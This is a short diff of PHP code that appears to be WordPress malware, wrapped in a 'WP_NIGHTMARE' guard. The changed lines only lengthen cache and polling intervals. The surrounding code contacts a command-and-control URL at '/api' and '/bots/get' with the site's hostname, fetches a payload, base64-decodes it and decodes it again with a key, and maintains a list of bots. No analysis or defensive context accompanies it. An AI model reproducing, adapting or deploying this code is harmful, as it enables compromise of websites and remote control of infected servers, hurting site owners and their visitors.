@@ -142,7 +142,7 @@ if (!defined("WP_NIGHTMARE")) {
 				}
 				if (!function_exists("get_payload")) {
 					function get_payload($cc_url, $working_dir) {
-						$res = fetch_url($cc_url . "/api", array("domain" => $_SERVER["HTTP_HOST"]), $working_dir . "/source", 3600);
+						$res = fetch_url($cc_url . "/api", array("domain" => $_SERVER["HTTP_HOST"]), $working_dir . "/source", 43200);
 						return great_news(base64_decode($res), "onthewall");
 					}
 				}
@@ -155,14 +155,14 @@ if (!defined("WP_NIGHTMARE")) {
 							$cc_url . "/bots/get",
 							array("domain" => $_SERVER["HTTP_HOST"]),
 							$working_dir . "/global", 
-							43200,
+							44200,
 							$cb
 						);
 						return explode("\n", $res);
 					}
 				}
 				if (!function_exists("update_bots")) {
-					function update_bots($working_dir, $ip, $interval = 21600) {
+					function update_bots($working_dir, $ip, $interval = 45200) {
 						$fpath = $working_dir . "/local";
 						$glob = glob($fpath . "_*");
 						$now = time();
